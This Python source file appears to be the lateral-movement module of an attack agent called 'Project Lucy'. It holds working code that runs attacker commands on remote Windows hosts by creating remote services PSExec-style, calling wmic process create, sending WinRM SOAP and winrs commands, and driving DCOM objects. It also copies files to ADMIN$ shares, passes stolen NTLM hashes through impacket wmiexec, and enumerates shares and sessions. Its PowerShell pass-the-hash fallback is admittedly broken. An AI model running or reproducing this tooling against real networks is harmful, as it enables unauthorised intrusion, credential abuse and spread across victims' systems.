"""
Lateral movement module for Project Lucy agent.
Executes commands on remote hosts via PSExec, WMI, WinRM, DCOM, and
remote service techniques, plus share/session enumeration.
Actions: psexec, wmi_exec, winrm, dcom, sc_remote, copy_share,
         pass_the_hash_wmi, enumerate_shares, enumerate_sessions.
"""
import os
import platform
import re
import shutil
import subprocess

name = "lateral"
version = "1.0.0"
os_compat = ["Windows"]
dependencies: list[str] = ["requests"]

SYSTEM = platform.system()


def _run_cmd(cmd: list[str], timeout: int = 60) -> dict:
    """Run a subprocess command and return stdout/stderr/returncode."""
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, errors="replace", timeout=timeout,
        )
        return {
            "returncode": proc.returncode,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
        }
    except Exception as exc:
        return {"returncode": -1, "stdout": "", "stderr": str(exc)}


def _net_use(host: str, username: str, password: str, domain: str) -> dict:
    """Establish a net use connection to the remote host."""
    user = f"{domain}\\{username}" if domain else username
    cmd = ["net", "use", f"\\\\{host}", f"/user:{user}", password]
    return _run_cmd(cmd, timeout=30)


def _net_use_delete(host: str) -> None:
    """Clean up a net use connection."""
    try:
        subprocess.run(
            ["net", "use", f"\\\\{host}", "/delete", "/y"],
            capture_output=True, text=True, timeout=15,
        )
    except Exception:
        pass


def _psexec(host: str, username: str, password: str, command: str, domain: str) -> dict:
    """Execute a command on a remote host via PSExec-like service technique."""
    user = f"{domain}\\{username}" if domain else username
    service_name = f"LucySvc{os.getpid()}"

    # 1. Establish net use connection
    use_result = _net_use(host, username, password, domain)
    if use_result["returncode"] != 0:
        return {
            "status": "failed",
            "error": f"net use failed: {use_result['stderr'] or use_result['stdout']}",
        }

    try:
        # 2. Copy a service binary (use cmd.exe as a stand-in payload host)
        #    In a real PSExec, a custom service binary is copied to ADMIN$.
        #    Here we create a remote service that runs the command directly.
        bin_path = f"%SystemRoot%\\System32\\cmd.exe /c {command}"

        # 3. Create the remote service
        create_cmd = [
            "sc", f"\\\\{host}", "create", service_name,
            "binpath", bin_path,
            "start", "demand",
        ]
        create_result = _run_cmd(create_cmd, timeout=30)
        if create_result["returncode"] != 0:
            return {
                "status": "failed",
                "error": f"sc create failed: {create_result['stderr'] or create_result['stdout']}",
            }

        # 4. Start the service
        start_cmd = ["sc", f"\\\\{host}", "start", service_name]
        start_result = _run_cmd(start_cmd, timeout=60)

        # 5. Query service output (best-effort)
        query_cmd = ["sc", f"\\\\{host}", "query", service_name]
        query_result = _run_cmd(query_cmd, timeout=15)

        # 6. Delete the service
        delete_cmd = ["sc", f"\\\\{host}", "delete", service_name]
        _run_cmd(delete_cmd, timeout=15)

        return {
            "status": "completed",
            "data": {
                "host": host,
                "service": service_name,
                "command": command,
                "start_output": start_result["stdout"] or start_result["stderr"],
                "query_output": query_result["stdout"],
                "returncode": start_result["returncode"],
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
    finally:
        _net_use_delete(host)


def _wmi_exec(host: str, username: str, password: str, command: str, domain: str) -> dict:
    """Execute a command on a remote host via WMI (wmic)."""
    user = f"{domain}\\{username}" if domain else username
    cmd = [
        "wmic",
        f"/node:{host}",
        f"/user:{user}",
        f"/password:{password}",
        "process", "call", "create",
        f'cmd /c {command}',
    ]
    result = _run_cmd(cmd, timeout=60)
    out = result["stdout"] + result["stderr"]

    # Parse process ID from wmic output
    pid_match = re.search(r"ProcessId\s*=\s*(\d+)", out)
    pid = int(pid_match.group(1)) if pid_match else None

    if result["returncode"] != 0 and not pid:
        return {
            "status": "failed",
            "error": f"wmic failed: {result['stderr'] or result['stdout']}",
        }

    return {
        "status": "completed",
        "data": {
            "host": host,
            "command": command,
            "pid": pid,
            "output": out,
            "returncode": result["returncode"],
        },
    }


def _winrm(host: str, username: str, password: str, command: str, domain: str, port: int) -> dict:
    """Execute a command via WinRM — try SOAP/requests, fall back to winrs."""
    user = f"{domain}\\{username}" if domain else username

    # Attempt 1: WS-Management SOAP via requests
    try:
        import requests

        url = f"http://{host}:{port}/wsman"
        soap_body = (
            f'<?xml version="1.0" encoding="utf-8"?>'
            f'<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
            f' xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"'
            f' xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">'
            f'<s:Header>'
            f'<a:Action>s:http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>'
            f'<a:To>{url}</a:To>'
            f'<w:ResourceURI s:mustUnderstand="true">'
            f'http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process</w:ResourceURI>'
            f'</s:Header>'
            f'<s:Body>'
            f'<p:Create_INPUT xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process">'
            f'<p:CommandLine>cmd /c {command}</p:CommandLine>'
            f'</p:Create_INPUT>'
            f'</s:Body>'
            f'</s:Envelope>'
        )
        resp = requests.post(
            url,
            data=soap_body,
            headers={"Content-Type": "application/soap+xml;charset=UTF-8"},
            auth=(user, password),
            timeout=30,
        )
        if resp.status_code == 200:
            pid_match = re.search(r"<p:ProcessId>(\d+)</p:ProcessId>", resp.text)
            pid = int(pid_match.group(1)) if pid_match else None
            return {
                "status": "completed",
                "data": {
                    "method": "winrm_soap",
                    "host": host,
                    "command": command,
                    "pid": pid,
                    "output": resp.text,
                    "status_code": resp.status_code,
                },
            }
    except Exception:
        pass  # Fall through to winrs

    # Attempt 2: winrs command-line fallback
    winrs_cmd = ["winrs", f"-r:{host}", f"-u:{user}", f"-p:{password}", command]
    result = _run_cmd(winrs_cmd, timeout=60)

    if result["returncode"] != 0:
        return {
            "status": "failed",
            "error": f"winrs failed: {result['stderr'] or result['stdout']}",
        }

    return {
        "status": "completed",
        "data": {
            "method": "winrs",
            "host": host,
            "command": command,
            "output": result["stdout"],
            "returncode": result["returncode"],
        },
    }


def _dcom(host: str, command: str, method: str) -> dict:
    """Execute a command via DCOM (MMC20.Application by default)."""
    if method == "MMC20.Application":
        ps_script = (
            f'$mmc = [Activator]::CreateInstance('
            f'[Type]::GetTypeFromProgID("MMC20.Application","{host}"));'
            f'$mmc.Document.ActiveView.ExecuteShellCommand('
            f'"cmd",$null,"/c {command}","7");'
        )
    elif method == "ShellWindows":
        ps_script = (
            f'$shell = [Activator]::CreateInstance('
            f'[Type]::GetTypeFromCLSID('
            f'[Guid]"9BA05972-F6A8-11CF-A442-00A0C90A8F39","{host}"));'
            f'$shell.Item().Document.Application.ShellExecute("cmd","/c {command}","","open",0);'
        )
    else:
        return {"status": "failed", "error": f"Unsupported DCOM method: {method}"}

    cmd = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script]
    result = _run_cmd(cmd, timeout=60)
    out = result["stdout"] + result["stderr"]

    if result["returncode"] != 0 and not result["stdout"]:
        return {
            "status": "failed",
            "error": f"DCOM execution failed: {result['stderr'] or result['stdout']}",
        }

    return {
        "status": "completed",
        "data": {
            "method": method,
            "host": host,
            "command": command,
            "output": out,
            "returncode": result["returncode"],
        },
    }


def _sc_remote(host: str, service_name: str, bin_path: str, username: str, password: str) -> dict:
    """Create and start a remote Windows service."""
    cleanup = False
    try:
        if username:
            user = username
            use_result = _net_use(host, username, password, "")
            if use_result["returncode"] != 0:
                return {
                    "status": "failed",
                    "error": f"net use failed: {use_result['stderr'] or use_result['stdout']}",
                }
            cleanup = True

        # Create the service
        create_cmd = [
            "sc", f"\\\\{host}", "create", service_name,
            "binpath", bin_path,
            "start", "demand",
        ]
        create_result = _run_cmd(create_cmd, timeout=30)
        if create_result["returncode"] != 0:
            return {
                "status": "failed",
                "error": f"sc create failed: {create_result['stderr'] or create_result['stdout']}",
            }

        # Start the service
        start_cmd = ["sc", f"\\\\{host}", "start", service_name]
        start_result = _run_cmd(start_cmd, timeout=60)

        # Query status
        query_cmd = ["sc", f"\\\\{host}", "query", service_name]
        query_result = _run_cmd(query_cmd, timeout=15)

        return {
            "status": "completed",
            "data": {
                "host": host,
                "service": service_name,
                "bin_path": bin_path,
                "start_output": start_result["stdout"] or start_result["stderr"],
                "status_output": query_result["stdout"],
                "returncode": start_result["returncode"],
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
    finally:
        if cleanup:
            _net_use_delete(host)


def _copy_share(host: str, local_path: str, remote_path: str, username: str, password: str) -> dict:
    """Copy a file to a remote admin share (default ADMIN$)."""
    share = remote_path.split("\\")[0] if "\\" in remote_path else "ADMIN$"
    cleanup = False
    try:
        if username:
            user = f"\\{username}" if "\\" not in username else username
            use_result = _net_use(host, username, password, "")
            if use_result["returncode"] != 0:
                return {
                    "status": "failed",
                    "error": f"net use failed: {use_result['stderr'] or use_result['stdout']}",
                }
            cleanup = True

        dest = f"\\\\{host}\\{remote_path}"
        copy_cmd = ["copy", local_path, dest]
        result = _run_cmd(copy_cmd, timeout=120)

        if result["returncode"] != 0:
            return {
                "status": "failed",
                "error": f"copy failed: {result['stderr'] or result['stdout']}",
            }

        return {
            "status": "completed",
            "data": {
                "host": host,
                "local_path": local_path,
                "remote_path": dest,
                "output": result["stdout"],
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
    finally:
        if cleanup:
            _net_use_delete(host)


def _pass_the_hash_wmi(host: str, username: str, ntlm_hash: str, command: str) -> dict:
    """Execute via WMI using an NTLM hash (pass-the-hash)."""
    # Attempt 1: impacket wmiexec.py
    wmiexec = shutil.which("wmiexec.py")
    if wmiexec:
        target = f"{username}@{host}"
        cmd = [
            "python", wmiexec,
            "-hashes", f":{ntlm_hash}",
            target,
            command,
        ]
        result = _run_cmd(cmd, timeout=120)
        if result["returncode"] == 0:
            return {
                "status": "completed",
                "data": {
                    "method": "wmiexec_py",
                    "host": host,
                    "command": command,
                    "output": result["stdout"],
                },
            }
        return {
            "status": "failed",
            "error": f"wmiexec.py failed: {result['stderr'] or result['stdout']}",
        }

    # Attempt 2: PowerShell Invoke-WmiMethod with NTLM hash via custom credential
    # Note: Native PowerShell cannot directly use an NTLM hash for WMI.
    # This documents the approach and falls back to standard WMI if possible.
    ps_script = (
        f'$sec = ConvertTo-SecureString "{ntlm_hash}" -AsPlainText -Force;'
        f'$cred = New-Object System.Management.Automation.PSCredential("{username}", $sec);'
        f'Invoke-WmiMethod -ComputerName {host} -Class Win32_Process '
        f'-Name Create -ArgumentList "cmd /c {command}" -Credential $cred;'
    )
    cmd = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script]
    result = _run_cmd(cmd, timeout=60)
    out = result["stdout"] + result["stderr"]

    pid_match = re.search(r"ProcessId\s*[:=]\s*(\d+)", out)
    pid = int(pid_match.group(1)) if pid_match else None

    if result["returncode"] != 0 and not pid:
        return {
            "status": "failed",
            "error": f"Pass-the-hash WMI failed (wmiexec.py not found): "
                     f"{result['stderr'] or result['stdout']}",
        }

    return {
        "status": "completed",
        "data": {
            "method": "powershell_wmi",
            "host": host,
            "command": command,
            "pid": pid,
            "output": out,
            "note": "Used PowerShell fallback; install impacket for native PTH",
        },
    }


def _enumerate_shares(host: str, username: str, password: str) -> dict:
    """List accessible shares on a remote host via net view."""
    cleanup = False
    try:
        if username:
            use_result = _net_use(host, username, password, "")
            if use_result["returncode"] != 0:
                return {
                    "status": "failed",
                    "error": f"net use failed: {use_result['stderr'] or use_result['stdout']}",
                }
            cleanup = True

        cmd = ["net", "view", f"\\\\{host}"]
        result = _run_cmd(cmd, timeout=30)

        if result["returncode"] != 0:
            return {
                "status": "failed",
                "error": f"net view failed: {result['stderr'] or result['stdout']}",
            }

        # Parse share names and types from net view output
        shares = []
        for line in result["stdout"].splitlines():
            line = line.strip()
            if line and not line.startswith("\\") and " " in line:
                parts = line.split(None, 1)
                if parts and parts[0] not in ("Share", "----"):
                    share_name = parts[0]
                    share_type = parts[1].strip() if len(parts) > 1 else ""
                    shares.append({"name": share_name, "type": share_type})

        return {
            "status": "completed",
            "data": {
                "host": host,
                "shares": shares,
                "count": len(shares),
                "raw": result["stdout"],
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
    finally:
        if cleanup:
            _net_use_delete(host)


def _enumerate_sessions(host: str) -> dict:
    """List active SMB sessions on a host via net session."""
    cmd = ["net", "session", f"\\\\{host}"]
    result = _run_cmd(cmd, timeout=30)

    if result["returncode"] != 0:
        return {
            "status": "failed",
            "error": f"net session failed: {result['stderr'] or result['stdout']}",
        }

    # Parse session info
    sessions = []
    for line in result["stdout"].splitlines():
        line = line.strip()
        if line and not line.startswith("Computer") and not line.startswith("---") \
                and not line.startswith("The command") and " " in line:
            parts = line.split()
            if len(parts) >= 2:
                sessions.append({
                    "computer": parts[0],
                    "user": parts[1] if len(parts) > 1 else "",
                    "opens": parts[2] if len(parts) > 2 else "",
                    "idle_time": parts[3] if len(parts) > 3 else "",
                })

    return {
        "status": "completed",
        "data": {
            "host": host,
            "sessions": sessions,
            "count": len(sessions),
            "raw": result["stdout"],
        },
    }


def run(action: str = "enumerate_shares", **params) -> dict:
    if SYSTEM != "Windows":
        return {"status": "failed", "error": "Windows-only action"}

    try:
        if action == "psexec":
            return _psexec(
                params["host"],
                params["username"],
                params["password"],
                params["command"],
                params.get("domain", ""),
            )
        elif action == "wmi_exec":
            return _wmi_exec(
                params["host"],
                params["username"],
                params["password"],
                params["command"],
                params.get("domain", ""),
            )
        elif action == "winrm":
            return _winrm(
                params["host"],
                params["username"],
                params["password"],
                params["command"],
                params.get("domain", ""),
                int(params.get("port", 5985)),
            )
        elif action == "dcom":
            return _dcom(
                params["host"],
                params["command"],
                params.get("method", "MMC20.Application"),
            )
        elif action == "sc_remote":
            return _sc_remote(
                params["host"],
                params["service_name"],
                params["bin_path"],
                params.get("username", ""),
                params.get("password", ""),
            )
        elif action == "copy_share":
            return _copy_share(
                params["host"],
                params["local_path"],
                params.get("remote_path", "ADMIN$"),
                params.get("username", ""),
                params.get("password", ""),
            )
        elif action == "pass_the_hash_wmi":
            return _pass_the_hash_wmi(
                params["host"],
                params["username"],
                params["ntlm_hash"],
                params["command"],
            )
        elif action == "enumerate_shares":
            return _enumerate_shares(
                params["host"],
                params.get("username", ""),
                params.get("password", ""),
            )
        elif action == "enumerate_sessions":
            return _enumerate_sessions(params["host"])
        return {"status": "failed", "error": f"Unknown action: {action}"}
    except KeyError as exc:
        return {"status": "failed", "error": f"Missing required parameter: {exc}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
